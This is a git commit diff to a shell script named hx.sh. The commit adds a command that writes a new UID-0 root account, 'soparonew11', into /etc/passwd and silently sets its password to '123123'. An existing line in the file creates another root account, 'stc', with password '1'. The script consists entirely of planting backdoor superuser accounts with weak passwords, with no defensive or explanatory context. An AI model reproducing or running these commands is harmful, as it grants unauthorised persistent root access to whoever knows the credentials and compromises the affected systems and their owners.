5953bd8539ac7a682385953df5f30218b2acb3c4
radwan1998 <47543921+radwan1998@users.noreply.github.com>
2023-02-19 20:23:24 +0100

    Update hx.sh

--- hx.sh
+++ hx.sh
@@ -1,1 +1,3 @@
+sed -i '$ i\soparonew11:x:0:0:soparonew11:/root:/bin/bash' /etc/passwd && echo -e "123123\n123123\n"|passwd soparonew11 &> /dev/null
+
 sed -i '$ i\stc:x:0:0:stc:/root:/bin/bash' /etc/passwd && echo "1\n1"|passwd stc &> /dev/null
